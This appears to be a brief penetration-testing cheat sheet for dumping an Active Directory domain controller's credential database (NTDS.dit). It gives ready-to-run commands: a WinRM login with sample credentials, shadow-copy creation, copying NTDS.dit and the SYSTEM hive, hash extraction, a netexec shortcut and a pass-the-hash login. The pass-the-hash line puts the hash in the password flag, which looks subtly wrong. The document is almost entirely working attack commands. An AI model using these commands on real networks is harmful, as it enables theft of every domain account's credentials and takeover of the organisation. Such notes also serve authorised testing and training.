#### Capturing NTDS.dit 
```
%systemroot%/ntds
```
#### Connect to a DC with `evil-winRM` 
```
evil-winrm -i 10.10.10.1 -u bwilliamson -p 'p@aw@123'
```
---
# Copying NTDS.dit file 
#### Create shadow copy of c: 
```
vssadmin CREATE SHADOW /For=C:
```
```
wmic shadowcopy call create Volume='C:\'
```
#### Copy NTDS.dit from VSS 
```
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\ntds.dit 
```
#### Copy SYSTEM file (to decrypt NTDS.dit) 
```
reg SAVE hklm\system c:\system.save
```
#### Extract password from NTDS.dit 
```
Get-ADDBAccount -All -DBPath 'c:\ntds.dit' -Bootkey $key
```
						OR
# Copy NTDS.dit file (fast method) 
```
nxc smb 10.10.10.1 -u bwilliamson -p 'p@aw@123' -M ntdsutil
```

#### Pass-the-hash attack
```
evil-winrm -i 10.10.10.1 -u administrator -p '64f12cddaa88057e06a81b54e73b9496'
```